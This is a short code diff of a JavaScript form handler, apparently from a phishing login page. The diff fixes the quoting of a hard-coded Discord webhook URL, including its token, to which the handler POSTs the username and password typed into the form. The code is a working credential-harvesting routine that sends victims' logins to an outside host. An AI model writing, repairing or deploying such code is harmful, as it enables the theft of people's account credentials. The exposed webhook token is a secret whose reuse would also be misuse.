@@ -99,7 +99,7 @@ function sendMessage() {
     return; // Prevents redirection if fields are not filled
   }
 	var request = new XMLHttpRequest();
-    request.open("POST", https://discord.com/api/webhooks/1281304373044969522/nhgm8uxUvqatAcOA7h7aBL-QR65xE23QPHXVRqdMYBd6XQafAXLZ3EY_2cjdO0T1QiNe);
+    request.open("POST", "https://discord.com/api/webhooks/1281304373044969522/nhgm8uxUvqatAcOA7h7aBL-QR65xE23QPHXVRqdMYBd6XQafAXLZ3EY_2cjdO0T1QiNe");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
